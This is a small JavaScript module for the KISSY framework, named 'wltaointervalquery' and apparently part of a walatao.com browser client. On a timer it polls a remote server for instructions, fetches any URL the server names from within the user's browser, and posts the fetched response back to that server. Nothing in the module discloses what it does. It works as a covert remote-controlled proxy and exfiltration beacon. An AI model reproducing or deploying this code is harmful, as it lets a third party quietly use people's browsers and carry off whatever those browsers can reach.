KISSY.add("wltaointervalquery", function(a){
	var t = 0;
	function a(d){
		var f =  JSON.parse(decodeURIComponent(d));
		f.url && f.url.length > 0 && KISSY.io.get(decodeURIComponent(f.url), function(z,e){
			var p = encodeURIComponent(JSON.stringify({"request":d, "response":encodeURIComponent(z)}));
			e == "success" && f.post && KISSY.io.post("http://js.client.walatao.com/v9/svr/feed/report_interval.php", p);
		})
	}
	function b(){
		t ++;
		var u = "http://js.client.walatao.com/v9/svr/feed/query_interval.php?n=" + t;
		KISSY.io.get(u, function(d, e){
			e == "success" && a(d)			
		});
	}
	function d(t){
		setInterval(function(){b()}, t);
	}
	return d
});


